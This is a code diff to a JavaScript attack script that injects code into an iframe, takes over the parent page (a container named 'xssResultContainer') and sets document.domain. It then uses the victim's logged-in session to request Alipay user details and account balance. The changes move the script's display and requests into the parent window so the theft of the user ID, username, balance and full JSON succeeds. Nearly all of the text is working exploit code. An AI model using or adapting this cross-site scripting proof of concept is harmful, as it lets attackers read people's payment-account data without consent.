@@ -240,23 +240,113 @@ function injectCodeToIframe(iframe) {
             // jQuery加载完成后执行主逻辑
             var mainScript = iframeDoc.createElement('script');
             mainScript.textContent = `
-        // 日志函数
+        // 获取父窗口和父文档
+        var parentWin = window.parent || parent;
+        var parentDoc = parentWin.document;
+        
+        // 确保父窗口有容器
+        function ensureParentContainer() {
+            if (!parentDoc.getElementById('xssResultContainer')) {
+                // 清空父窗口body
+                parentDoc.body.innerHTML = '';
+                parentDoc.body.style.cssText = 'margin: 0; padding: 20px; background: #f5f5f5; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;';
+                
+                // 创建样式
+                var parentStyle = parentDoc.createElement('style');
+                parentStyle.textContent = \`
+                    * { margin: 0; padding: 0; box-sizing: border-box; }
+                    .container { max-width: 1200px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
+                    h1 { color: #1677ff; border-bottom: 3px solid #1677ff; padding-bottom: 10px; margin-bottom: 20px; }
+                    h2 { color: #333; margin-top: 30px; margin-bottom: 15px; }
+                    .log-container { background: #1f1f1f; color: #0f0; font-family: monospace; font-size: 12px; padding: 15px; border-radius: 8px; margin-bottom: 20px; max-height: 300px; overflow-y: auto; border: 2px solid #0f0; }
+                    .log-entry { margin: 5px 0; padding: 3px 0; border-bottom: 1px solid #333; }
+                    .log-entry.error { color: #f00; }
+                    .log-entry.success { color: #0f0; }
+                    .log-entry.info { color: #0ff; }
+                    .log-entry.warning { color: #ff0; }
+                    .info-box { margin: 20px 0; padding: 15px; border-radius: 8px; border-left: 4px solid #1677ff; }
+                    .info-box.user { background: #f0f5ff; }
+                    .info-box.balance { background: #f6ffed; border-left-color: #52c41a; }
+                    .info-box.error { background: #fff2f0; border-left-color: #ff4d4f; color: #ff4d4f; }
+                    .balance-amount { font-size: 32px; font-weight: bold; color: #52c41a; margin: 10px 0; }
+                    textarea { width: 100%; height: 400px; font-family: monospace; font-size: 12px; padding: 10px; border: 1px solid #d9d9d9; border-radius: 4px; resize: vertical; }
+                    code { background: #f5f5f5; padding: 2px 6px; border-radius: 3px; font-family: monospace; }
+                    .meta-info { background: #fafafa; padding: 10px; border-radius: 4px; font-size: 12px; color: #666; margin-bottom: 20px; }
+                    .step-indicator { background: #e6f7ff; padding: 10px; border-radius: 4px; margin: 10px 0; border-left: 4px solid #1677ff; }
+                \`;
+                parentDoc.head.appendChild(parentStyle);
+                
+                // 创建容器
+                var container = parentDoc.createElement('div');
+                container.id = 'xssResultContainer';
+                container.className = 'container';
+                container.innerHTML = \`
+                    <h1>🔐 支付宝账户信息查询</h1>
+                    <h2>📋 执行日志</h2>
+                    <div id="logContainer" class="log-container"><div class="log-entry info">⏳ 初始化中...</div></div>
+                    <div class="meta-info">
+                        <strong>执行环境:</strong><br>
+                        • Window Location: <code id="winLocation">检测中...</code><br>
+                        • Document Domain: <code id="docDomain">检测中...</code><br>
+                        • Origin: <code id="origin">检测中...</code><br>
+                        • Referer: <code id="referer">检测中...</code>
+                    </div>
+                    <h2>👤 用户信息</h2>
+                    <div id="userInfo" class="info-box user loading"><p>⏳ 等待开始...</p></div>
+                    <h2>💰 账户余额</h2>
+                    <div id="balance" class="info-box balance loading"><p>⏳ 等待用户信息加载完成...</p></div>
+                    <h2>📄 完整JSON数据</h2>
+                    <textarea id="jsonData" placeholder="等待数据加载..." readonly></textarea>
+                \`;
+                parentDoc.body.appendChild(container);
+            }
+        }
+        
+        // 日志函数 - 输出到父窗口
         function addLog(message, type) {
-            var logContainer = document.getElementById('logContainer');
-            var logEntry = document.createElement('div');
-            logEntry.className = 'log-entry ' + (type || 'info');
-            var timestamp = new Date().toLocaleTimeString();
-            var icon = type === 'error' ? '❌' : type === 'success' ? '✅' : type === 'warning' ? '⚠️' : '📝';
-            logEntry.textContent = '[' + timestamp + '] ' + icon + ' ' + message;
-            logContainer.appendChild(logEntry);
-            logContainer.scrollTop = logContainer.scrollHeight;
+            try {
+                ensureParentContainer();
+                var logContainer = parentDoc.getElementById('logContainer');
+                if (logContainer) {
+                    var logEntry = parentDoc.createElement('div');
+                    logEntry.className = 'log-entry ' + (type || 'info');
+                    var timestamp = new Date().toLocaleTimeString();
+                    var icon = type === 'error' ? '❌' : type === 'success' ? '✅' : type === 'warning' ? '⚠️' : '📝';
+                    logEntry.textContent = '[' + timestamp + '] ' + icon + ' ' + message;
+                    logContainer.appendChild(logEntry);
+                    logContainer.scrollTop = logContainer.scrollHeight;
+                }
+            } catch(e) {
+                console.error('添加日志失败:', e);
+            }
             console.log('[' + type + '] ' + message);
+        }
+        
+        // 辅助函数：在父窗口中查找元素
+        function $(selector) {
+            try {
+                ensureParentContainer();
+                return parentWin.jQuery ? parentWin.jQuery(selector) : parentDoc.querySelector(selector);
+            } catch(e) {
+                console.error('查询元素失败:', e);
+                return null;
+            }
         }
         
         // 等待jQuery加载
         function init() {
-            if (typeof jQuery === 'undefined') {
-                addLog('jQuery 加载失败，请刷新重试', 'error');
+            // 检查父窗口是否有jQuery，如果没有则加载
+            if (typeof parentWin.jQuery === 'undefined') {
+                var jqueryScript = parentDoc.createElement('script');
+                jqueryScript.src = 'https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js';
+                jqueryScript.onload = function() {
+                    addLog('jQuery 加载成功', 'success');
+                    setTimeout(init, 100);
+                };
+                jqueryScript.onerror = function() {
+                    addLog('jQuery 加载失败，请刷新重试', 'error');
+                };
+                parentDoc.head.appendChild(jqueryScript);
                 return;
             }
             
@@ -274,10 +364,19 @@ function injectCodeToIframe(iframe) {
             addLog('  - window.origin: ' + origin, 'info');
             addLog('  - document.referrer: ' + referer, 'info');
             
-            $('#winLocation').text(winLocation);
-            $('#docDomain').text(docDomain);
-            $('#origin').text(origin);
-            $('#referer').text(referer);
+            try {
+                ensureParentContainer();
+                var winLocationEl = parentDoc.getElementById('winLocation');
+                var docDomainEl = parentDoc.getElementById('docDomain');
+                var originEl = parentDoc.getElementById('origin');
+                var refererEl = parentDoc.getElementById('referer');
+                if (winLocationEl) winLocationEl.textContent = winLocation;
+                if (docDomainEl) docDomainEl.textContent = docDomain;
+                if (originEl) originEl.textContent = origin;
+                if (refererEl) refererEl.textContent = referer;
+            } catch(e) {
+                console.error('更新环境信息失败:', e);
+            }
             
             // 设置document.domain
             try {
@@ -293,14 +392,9 @@ function injectCodeToIframe(iframe) {
             }, 500);
         }
         
-        // 检查jQuery是否已加载
-        if (typeof jQuery !== 'undefined') {
-            init();
-        } else {
-            window.addEventListener('load', function() {
-                setTimeout(init, 100);
-            });
-        }
+        // 初始化
+        ensureParentContainer();
+        setTimeout(init, 100);
         
         function main() {
             addLog('开始执行主流程', 'info');
@@ -313,11 +407,21 @@ function injectCodeToIframe(iframe) {
             addLog('请求URL: ' + userInfoUrl, 'info');
             addLog('设置Referer: ' + refererUrl, 'info');
             
-            $('#userInfo').html('<div class="step-indicator">📡 正在请求用户信息...</div>');
+            try {
+                ensureParentContainer();
+                var userInfoEl = parentDoc.getElementById('userInfo');
+                if (userInfoEl) userInfoEl.innerHTML = '<div class="step-indicator">📡 正在请求用户信息...</div>';
+            } catch(e) {}
             
             addLog('注意: Referer由浏览器自动设置为当前页面URL', 'info');
             
-            $.ajax({
+            // 使用父窗口的jQuery
+            if (typeof parentWin.jQuery === 'undefined') {
+                addLog('父窗口jQuery未加载，无法发送请求', 'error');
+                return;
+            }
+            
+            parentWin.jQuery.ajax({
                 url: userInfoUrl,
                 type: 'GET',
                 data: {
@@ -343,11 +447,16 @@ function injectCodeToIframe(iframe) {
                         addLog('解析用户ID: ' + logonUserId, 'success');
                         addLog('解析用户名: ' + logonName, 'success');
                         
-                        $('#userInfo').removeClass('loading').html(
-                            '<div class="step-indicator">✅ 用户信息获取成功</div>' +
-                            '<p><strong>用户ID:</strong> <code>' + logonUserId + '</code></p>' +
-                            '<p><strong>用户名:</strong> ' + logonName + '</p>'
-                        );
+                        try {
+                            ensureParentContainer();
+                            var userInfoEl = parentDoc.getElementById('userInfo');
+                            if (userInfoEl) {
+                                userInfoEl.className = 'info-box user';
+                                userInfoEl.innerHTML = '<div class="step-indicator">✅ 用户信息获取成功</div>' +
+                                    '<p><strong>用户ID:</strong> <code>' + logonUserId + '</code></p>' +
+                                    '<p><strong>用户名:</strong> ' + logonName + '</p>';
+                            }
+                        } catch(e) {}
                         
                         // 获取账户详情
                         setTimeout(function() {
@@ -355,9 +464,14 @@ function injectCodeToIframe(iframe) {
                         }, 500);
                     } catch(e) {
                         addLog('解析用户信息失败: ' + e.message, 'error');
-                        $('#userInfo').removeClass('loading').addClass('error').html(
-                            '<p><strong>❌ 解析失败:</strong> ' + e.message + '</p>'
-                        );
+                        try {
+                            ensureParentContainer();
+                            var userInfoEl = parentDoc.getElementById('userInfo');
+                            if (userInfoEl) {
+                                userInfoEl.className = 'info-box error';
+                                userInfoEl.innerHTML = '<p><strong>❌ 解析失败:</strong> ' + e.message + '</p>';
+                            }
+                        } catch(e) {}
                     }
                 },
                 error: function(xhr, status, error) {
@@ -366,12 +480,17 @@ function injectCodeToIframe(iframe) {
                     addLog('状态码: ' + xhr.status, 'error');
                     addLog('响应内容: ' + xhr.responseText.substring(0, 200), 'error');
                     
-                    $('#userInfo').removeClass('loading').addClass('error').html(
-                        '<div class="step-indicator">❌ 获取失败</div>' +
-                        '<p><strong>错误:</strong> ' + error + '</p>' +
-                        '<p><strong>状态码:</strong> ' + xhr.status + '</p>' +
-                        '<p style="font-size: 12px;">可能原因: 未登录、Cookie过期、或CORS限制</p>'
-                    );
+                    try {
+                        ensureParentContainer();
+                        var userInfoEl = parentDoc.getElementById('userInfo');
+                        if (userInfoEl) {
+                            userInfoEl.className = 'info-box error';
+                            userInfoEl.innerHTML = '<div class="step-indicator">❌ 获取失败</div>' +
+                                '<p><strong>错误:</strong> ' + error + '</p>' +
+                                '<p><strong>状态码:</strong> ' + xhr.status + '</p>' +
+                                '<p style="font-size: 12px;">可能原因: 未登录、Cookie过期、或CORS限制</p>';
+                        }
+                    } catch(e) {}
                 }
             });
         }
@@ -389,11 +508,21 @@ function injectCodeToIframe(iframe) {
             addLog('请求URL: ' + accountUrl, 'info');
             addLog('设置Referer: ' + refererUrl, 'info');
             
-            $('#balance').html('<div class="step-indicator">📡 正在请求账户余额...</div>');
+            try {
+                ensureParentContainer();
+                var balanceEl = parentDoc.getElementById('balance');
+                if (balanceEl) balanceEl.innerHTML = '<div class="step-indicator">📡 正在请求账户余额...</div>';
+            } catch(e) {}
             
             addLog('注意: Referer由浏览器自动设置为当前页面URL', 'info');
             
-            $.ajax({
+            // 使用父窗口的jQuery
+            if (typeof parentWin.jQuery === 'undefined') {
+                addLog('父窗口jQuery未加载，无法发送请求', 'error');
+                return;
+            }
+            
+            parentWin.jQuery.ajax({
                 url: accountUrl,
                 type: 'POST',
                 data: {
@@ -429,23 +558,34 @@ function injectCodeToIframe(iframe) {
                         
                         addLog('解析账户余额: ¥' + balance, 'success');
                         
-                        $('#balance').removeClass('loading').html(
-                            '<div class="step-indicator">✅ 账户余额获取成功</div>' +
-                            '<div class="balance-amount">¥ ' + balance + '</div>' +
-                            '<p style="color: #666; font-size: 14px;">查询时间: ' + new Date().toLocaleString() + '</p>'
-                        );
-                        
-                        $('#jsonData').val(JSON.stringify(response, null, 2));
+                        try {
+                            ensureParentContainer();
+                            var balanceEl = parentDoc.getElementById('balance');
+                            if (balanceEl) {
+                                balanceEl.className = 'info-box balance';
+                                balanceEl.innerHTML = '<div class="step-indicator">✅ 账户余额获取成功</div>' +
+                                    '<div class="balance-amount">¥ ' + balance + '</div>' +
+                                    '<p style="color: #666; font-size: 14px;">查询时间: ' + new Date().toLocaleString() + '</p>';
+                            }
+                            var jsonDataEl = parentDoc.getElementById('jsonData');
+                            if (jsonDataEl) jsonDataEl.value = JSON.stringify(response, null, 2);
+                        } catch(e) {}
                         addLog('完整JSON数据已显示在文本框中', 'success');
                         addLog('所有请求完成！', 'success');
                     } catch(e) {
                         addLog('解析账户详情失败: ' + e.message, 'error');
                         addLog('错误堆栈: ' + e.stack, 'error');
-                        $('#balance').removeClass('loading').addClass('error').html(
-                            '<div class="step-indicator">❌ 解析失败</div>' +
-                            '<p><strong>错误:</strong> ' + e.message + '</p>'
-                        );
-                        $('#jsonData').val(JSON.stringify(response, null, 2));
+                        try {
+                            ensureParentContainer();
+                            var balanceEl = parentDoc.getElementById('balance');
+                            if (balanceEl) {
+                                balanceEl.className = 'info-box error';
+                                balanceEl.innerHTML = '<div class="step-indicator">❌ 解析失败</div>' +
+                                    '<p><strong>错误:</strong> ' + e.message + '</p>';
+                            }
+                            var jsonDataEl = parentDoc.getElementById('jsonData');
+                            if (jsonDataEl) jsonDataEl.value = JSON.stringify(response, null, 2);
+                        } catch(e) {}
                     }
                 },
                 error: function(xhr, status, error) {
@@ -454,12 +594,17 @@ function injectCodeToIframe(iframe) {
                     addLog('状态码: ' + xhr.status, 'error');
                     addLog('响应内容: ' + xhr.responseText.substring(0, 200), 'error');
                     
-                    $('#balance').removeClass('loading').addClass('error').html(
-                        '<div class="step-indicator">❌ 获取失败</div>' +
-                        '<p><strong>错误:</strong> ' + error + '</p>' +
-                        '<p><strong>状态码:</strong> ' + xhr.status + '</p>' +
-                        '<p style="font-size: 12px;">可能原因: ctoken无效、未登录、或CORS限制</p>'
-                    );
+                    try {
+                        ensureParentContainer();
+                        var balanceEl = parentDoc.getElementById('balance');
+                        if (balanceEl) {
+                            balanceEl.className = 'info-box error';
+                            balanceEl.innerHTML = '<div class="step-indicator">❌ 获取失败</div>' +
+                                '<p><strong>错误:</strong> ' + error + '</p>' +
+                                '<p><strong>状态码:</strong> ' + xhr.status + '</p>' +
+                                '<p style="font-size: 12px;">可能原因: ctoken无效、未登录、或CORS限制</p>';
+                        }
+                    } catch(e) {}
                 }
             });
         }
